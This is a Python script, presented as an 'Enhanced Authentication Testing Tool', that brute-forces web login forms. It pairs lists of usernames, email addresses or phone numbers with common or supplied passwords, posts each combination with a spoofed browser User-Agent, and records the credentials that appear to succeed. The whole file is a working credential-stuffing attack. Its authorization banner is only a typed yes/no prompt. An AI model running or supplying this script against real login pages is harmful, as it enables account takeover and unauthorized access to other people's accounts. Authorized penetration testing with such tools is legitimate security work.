#!/usr/bin/python3
"""
Enhanced Authentication Testing Tool
For authorized security assessment and educational purposes only.
Supports phone numbers, email addresses, and usernames with cross-testing capabilities.
Use only on systems you own or have explicit permission to test.
"""

import requests
import time
import argparse
import json
import re
from typing import List, Dict, Union, Tuple
from datetime import datetime
import os

class AuthTester:
    """Main authentication testing class with enhanced capabilities"""
    
    def __init__(self, target_url: str, delay: float = 0.5):
        self.target_url = target_url
        self.delay = delay
        self.results = {
            "valid_credentials": [],
            "tested_combinations": 0,
            "failed_attempts": 0,
            "start_time": None,
            "end_time": None
        }
    
    def validate_phone(self, phone: str) -> bool:
        """Validate phone number format"""
        # Basic phone validation (adjust pattern as needed)
        pattern = r'^[\+]?[\d\s\-\(\)]{8,20}$'
        return bool(re.match(pattern, phone.strip()))
    
    def validate_email(self, email: str) -> bool:
        """Validate email address format"""
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return bool(re.match(pattern, email.strip()))
    
    def load_identifiers(self, identifier_file: str, identifier_type: str) -> List[str]:
        """Load identifiers from file based on type"""
        identifiers = []
        
        if not identifier_file:
            return identifiers
        
        try:
            with open(identifier_file, 'r') as f:
                for line in f:
                    identifier = line.strip()
                    if identifier:
                        # Validate based on type
                        if identifier_type == "phone" and self.validate_phone(identifier):
                            identifiers.append(identifier)
                        elif identifier_type == "email" and self.validate_email(identifier):
                            identifiers.append(identifier)
                        elif identifier_type == "username":
                            identifiers.append(identifier)
                        else:
                            print(f"Warning: Skipping invalid {identifier_type}: {identifier}")
        except FileNotFoundError:
            print(f"Warning: {identifier_type} file not found: {identifier_file}")
        except Exception as e:
            print(f"Error loading {identifier_type}s: {e}")
        
        return identifiers[:200]  # Limit to 200 entries
    
    def load_passwords(self, password_file: str = None) -> List[str]:
        """Load passwords from file or use defaults"""
        default_passwords = [
            "password123", "qwerty123", "admin123",
            "12345678", "welcome123", "testpass",
            "password", "123456", "123456789",
            "qwerty", "abc123", "admin"
        ]
        
        passwords = default_passwords
        
        if password_file:
            try:
                with open(password_file, 'r') as f:
                    passwords = [line.strip() for line in f.readlines() if line.strip()]
            except FileNotFoundError:
                print(f"Warning: Passwords file not found: {password_file}")
        
        return passwords[:200]  # Limit to 200 entries
    
    def test_credential(self, identifier: str, password: str, 
                        username_field: str = "username",
                        password_field: str = "password",
                        success_indicators: List[str] = None) -> bool:
        """Test a single credential pair"""
        
        if success_indicators is None:
            success_indicators = [
                "dashboard", "welcome", "success",
                "profile", "logged in", "auth token",
                "redirect", "home", "index"
            ]
        
        try:
            payload = {
                username_field: identifier,
                password_field: password
            }
            
            # Add delay to avoid overwhelming the server
            time.sleep(self.delay)
            
            response = requests.post(
                url=self.target_url,
                data=payload,
                timeout=10,
                allow_redirects=True,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            )
            
            # Check response for success indicators
            response_text = response.text.lower()
            response_url = response.url.lower()
            
            # Check for success indicators in response
            if any(indicator.lower() in response_text for indicator in success_indicators):
                return True
            
            # Check for redirect to dashboard/profile pages
            if any(term in response_url for term in ['dashboard', 'home', 'profile', 'account']):
                return True
            
            # Check if cookies or tokens were set
            if any('auth' in cookie.name.lower() or 'token' in cookie.name.lower() 
                   or 'session' in cookie.name.lower()
                   for cookie in response.cookies):
                return True
            
            # Check for status code (some APIs use 200 for success)
            if response.status_code == 200 and len(response_text) > 100:
                # Additional check: if it's not a login page again
                if 'login' not in response_text and 'error' not in response_text:
                    return True
            
            return False
            
        except requests.exceptions.RequestException as e:
            print(f"Request error for {identifier}: {e}")
            return False
        except Exception as e:
            print(f"Unexpected error: {e}")
            return False
    
    def run_cross_test(self, identifiers: List[str], passwords: List[str],
                      identifier_type: str, username_field: str = "username",
                      password_field: str = "password") -> Dict:
        """Test all identifier/password combinations in both directions"""
        
        self.results["start_time"] = datetime.now()
        total_tests = len(identifiers) * len(passwords)
        
        print(f"\n{'='*60}")
        print(f"Starting Authentication Test - {identifier_type.upper()} Testing")
        print(f"{'='*60}")
        print(f"Identifiers: {len(identifiers)}")
        print(f"Passwords: {len(passwords)}")
        print(f"Total combinations: {total_tests}")
        print(f"{'='*60}\n")
        
        test_count = 0
        
        # Test each identifier against each password
        for identifier in identifiers:
            print(f"\nTesting {identifier_type}: {identifier}")
            
            for password in passwords:
                test_count += 1
                print(f"  [{test_count}/{total_tests}] Testing password: {password[:8]}...", end=" ", flush=True)
                
                success = self.test_credential(
                    identifier, password,
                    username_field, password_field
                )
                
                if success:
                    print("✓ VALID! ✓")
                    self.results["valid_credentials"].append({
                        "type": identifier_type,
                        "identifier": identifier,
                        "password": password,
                        "timestamp": datetime.now().isoformat()
                    })
                    self.results["tested_combinations"] += 1
                else:
                    print("✗")
                    self.results["tested_combinations"] += 1
                    self.results["failed_attempts"] += 1
        
        self.results["end_time"] = datetime.now()
        return self.results
    
    def save_results(self, output_file: str = None):
        """Save test results to file"""
        
        # Calculate duration
        if self.results["start_time"] and self.results["end_time"]:
            duration = (self.results["end_time"] - self.results["start_time"]).total_seconds()
            self.results["duration_seconds"] = duration
        
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2)
            print(f"\n✓ Results saved to {output_file}")
        else:
            self.print_summary()
    
    def print_summary(self):
        """Print test results summary"""
        print("\n" + "="*60)
        print("TEST RESULTS SUMMARY")
        print("="*60)
        print(f"Total combinations tested: {self.results['tested_combinations']}")
        print(f"Valid credentials found: {len(self.results['valid_credentials'])}")
        print(f"Failed attempts: {self.results['failed_attempts']}")
        
        if self.results.get("duration_seconds"):
            print(f"Duration: {self.results['duration_seconds']:.2f} seconds")
        
        if self.results["valid_credentials"]:
            print("\n" + "="*60)
            print("VALID CREDENTIALS FOUND:")
            print("="*60)
            for cred in self.results["valid_credentials"]:
                print(f"\n  Type: {cred['type'].upper()}")
                print(f"  Identifier: {cred['identifier']}")
                print(f"  Password: {cred['password']}")
                print(f"  Found at: {cred['timestamp']}")
        else:
            print("\nNo valid credentials found.")
        
        print("\n" + "="*60)

def main():
    parser = argparse.ArgumentParser(
        description="Enhanced Authentication Testing Tool with Multi-Type Support",
        epilog="WARNING: Only use on systems you own or have explicit permission to test!"
    )
    
    parser.add_argument(
        "target_url",
        help="Target login URL"
    )
    
    parser.add_argument(
        "-p", "--passwords-file",
        help="File containing passwords (one per line)"
    )
    
    # Identifier type arguments
    parser.add_argument(
        "--phone-file",
        help="File containing phone numbers (one per line)"
    )
    
    parser.add_argument(
        "--email-file",
        help="File containing email addresses (one per line)"
    )
    
    parser.add_argument(
        "--username-file",
        help="File containing usernames (one per line)"
    )
    
    parser.add_argument(
        "--identifier-type",
        choices=["phone", "email", "username", "all"],
        default="all",
        help="Type of identifier to test (default: all)"
    )
    
    parser.add_argument(
        "--username-field",
        default="username",
        help="Username/identifier field name in login form (default: username)"
    )
    
    parser.add_argument(
        "--password-field",
        default="password",
        help="Password field name in login form (default: password)"
    )
    
    parser.add_argument(
        "-o", "--output",
        help="Output file for results (JSON format)"
    )
    
    parser.add_argument(
        "--delay",
        type=float,
        default=0.5,
        help="Delay between requests in seconds (default: 0.5)"
    )
    
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Enable verbose output"
    )
    
    args = parser.parse_args()
    
    # Warning banner
    print("\n" + "="*70)
    print("⚠️  WARNING: Enhanced Authentication Testing Tool ⚠️")
    print("="*70)
    print("This tool is for AUTHORIZED security testing ONLY!")
    print("\nYou MUST have EXPLICIT WRITTEN PERMISSION to test:")
    print("  • Systems you don't own")
    print("  • Accounts you don't own")
    print("  • Networks you don't manage")
    print("\nUnauthorized testing is ILLEGAL and UNETHICAL!")
    print("="*70 + "\n")
    
    response = input("Do you have authorization to test this target? (yes/no): ")
    if response.lower() != 'yes':
        print("❌ Exiting. Obtain proper authorization before proceeding.")
        return
    
    # Initialize tester
    tester = AuthTester(args.target_url, args.delay)
    
    # Load all identifiers based on type selection
    identifiers_data = {}
    
    if args.identifier_type in ["phone", "all"] and args.phone_file:
        identifiers_data["phone"] = tester.load_identifiers(args.phone_file, "phone")
        if identifiers_data["phone"]:
            print(f"✓ Loaded {len(identifiers_data['phone'])} phone numbers")
    
    if args.identifier_type in ["email", "all"] and args.email_file:
        identifiers_data["email"] = tester.load_identifiers(args.email_file, "email")
        if identifiers_data["email"]:
            print(f"✓ Loaded {len(identifiers_data['email'])} email addresses")
    
    if args.identifier_type in ["username", "all"] and args.username_file:
        identifiers_data["username"] = tester.load_identifiers(args.username_file, "username")
        if identifiers_data["username"]:
            print(f"✓ Loaded {len(identifiers_data['username'])} usernames")
    
    if not identifiers_data:
        print("❌ Error: No valid identifier files provided!")
        print("Please provide at least one of: --phone-file, --email-file, --username-file")
        return
    
    # Load passwords
    passwords = tester.load_passwords(args.passwords_file)
    if not passwords:
        print("❌ Error: No passwords loaded!")
        return
    
    print(f"✓ Loaded {len(passwords)} passwords\n")
    
    # Run tests for each identifier type
    for id_type, identifiers in identifiers_data.items():
        if identifiers:
            print(f"\n{'='*60}")
            print(f"Testing {id_type.upper()} Identifiers")
            print(f"{'='*60}")
            
            results = tester.run_cross_test(
                identifiers, passwords, id_type,
                args.username_field, args.password_field
            )
    
    # Save and display results
    tester.save_results(args.output)
    
    print("\n✅ Testing completed successfully!")

if __name__ == "__main__":
    main()
